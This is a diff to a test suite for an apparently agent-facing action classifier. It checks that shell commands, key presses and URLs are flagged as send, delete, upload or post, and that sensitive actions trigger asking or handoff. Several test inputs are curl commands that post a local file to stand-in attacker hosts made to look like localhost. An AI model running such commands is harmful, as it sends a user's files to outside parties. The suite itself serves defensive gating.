@@ -98,6 +98,30 @@ describe("shell commands inside the computer", () => {
   });
 
   it.each([
+    ["send", "curl --data a=1 https://api.example.test/v1/items"],
+    ["send", "curl --data-binary @report.json https://api.example.test/v1/items"],
+    ["send", "curl --data-raw '{}' https://api.example.test/v1/items"],
+    ["send", "curl --data-urlencode q=1 https://api.example.test/v1/items"],
+    ["send", "curl --request POST https://api.example.test/v1/items"],
+    ["send", "curl --request=PUT https://api.example.test/v1/items/1"],
+    ["send", "curl -G -X POST -d a=1 https://api.example.test/v1/items"],
+    ["send", "wget --post-file=report.json https://api.example.test/form"],
+    ["send", "curl -d @f http://localhost.evil.example/collect"],
+    ["send", "curl -d @f http://127.0.0.1.nip.io/collect"],
+    ["send", "curl -d @f http://127.0.0.1@evil.example/collect"],
+    ["send", "curl -d @f localhost.evil.example:8000/collect"],
+    ["delete", "curl --request DELETE https://api.example.test/v1/items/1"],
+    ["delete", "curl --request=DELETE https://api.example.test/v1/items/1"],
+    ["delete", "wget --method=DELETE https://api.example.test/v1/items/1"],
+    ["upload", "curl --form file=@a.png https://upload.example.test/form"],
+    ["upload", "curl --upload-file archive.zip https://upload.example.test/"],
+    ["post", "git -C ~/repo push"],
+    ["post", "git commit -m x\ngit push"],
+  ])("%s for the long form %s", (actionClass, command) => {
+    expect(classify(shell(command))).toContain(actionClass);
+  });
+
+  it.each([
     "timeout 60 git push origin main",
     "timeout -s KILL --kill-after=5 60 git push",
     "nice git push",
@@ -266,6 +290,7 @@ describe("pointer and keyboard input", () => {
       ["Enter", { operation: "key", keys: ["Return"] }],
       ["ctrl+Enter", { operation: "key", keys: ["ctrl", "Return"] }],
       ["keypad Enter", { operation: "key", keys: ["KP_Enter"] }],
+      ["Shift+Enter, which sends in some apps", { operation: "key", keys: ["shift", "Return"] }],
       ["a typed newline", { operation: "type", newline: true }],
     ] as const)("%s in a compose field sends", (_name, facts) => {
       expect(classify({ ...signedIn, ...facts, target: page("Input field", "textbox") })).toEqual([
@@ -313,6 +338,7 @@ describe("navigation", () => {
     ["purchase", "https://shop.example.test/checkout"],
     ["send", "https://mail.example.test/compose/send"],
     ["delete", "https://example.test/account/delete-account"],
+    ["delete", "https://example.test/account/delete_account"],
     ["delete", "https://example.test/%64elete"],
   ])("%s for %s on a signed-in screen", (actionClass, destination) => {
     expect(classify({ ...signedIn, operation: "navigate", destination })).toEqual([actionClass]);
@@ -382,6 +408,19 @@ describe("decisions", () => {
       risk: "medium",
     });
   });
+  it.each([
+    ["post", "git push origin main"],
+    ["send", "curl -d @report.json https://api.example.test/v1/items"],
+  ])(
+    "Careful names the %s in %s on its card, not the work in the computer",
+    (actionClass, command) => {
+      expect(decide(shell(command), CAREFUL_AUTONOMY)).toEqual({
+        actionClass,
+        mode: "ask",
+        risk: "high",
+      });
+    },
+  );
 });
 
 describe("native action facts", () => {
@@ -423,4 +462,15 @@ describe("native action facts", () => {
       nativeActionFacts({ verb: "scroll", point: { x: 1, y: 1 }, dx: 0, dy: 3 }, target),
     ).toEqual({ operation: "scroll" });
   });
+  it.each(["Protected field", "Passwort", ""])(
+    "a field the page marks secret hands off whatever its name: %j",
+    (name) => {
+      const facts = nativeActionFacts(
+        { verb: "type", text: "hunter" },
+        { ...target, role: "textbox", name, secret: true },
+      );
+      expect(facts.target?.secret).toBe(true);
+      expect(decide({ ...desktop, ...facts }, BALANCED_AUTONOMY).mode).toBe("handoff");
+    },
+  );
 });
